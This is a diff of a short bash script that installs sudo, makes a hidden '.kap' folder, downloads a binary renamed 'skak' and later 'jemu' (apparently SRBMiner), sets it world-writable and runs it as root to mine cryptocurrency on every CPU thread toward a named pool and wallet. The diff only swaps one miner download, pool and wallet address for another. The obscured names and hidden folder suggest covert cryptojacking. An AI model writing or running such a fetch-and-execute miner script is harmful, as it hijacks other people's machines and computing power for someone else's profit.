@@ -1,6 +1,6 @@
 #!/bin/bash
 apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
-wget -O skak https://github.com/nandafiku/fillesg/raw/main/serbe
-chmod 777 skak
-sudo ./skak --algorithm aurum --pool 45.76.185.233:443 --wallet bit1qvfwy07cf2yn2ue03xu2na8lw2gzmytzrttsfcy.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
+wget -O jemu https://github.com/nandafiku/gradi/raw/main/SRBMiner-247
+chmod 777 jemu
+sudo ./jemu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet bit1q47297ttj4g0cytwtkuqmn6ss5ytsh4eggvndrm.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
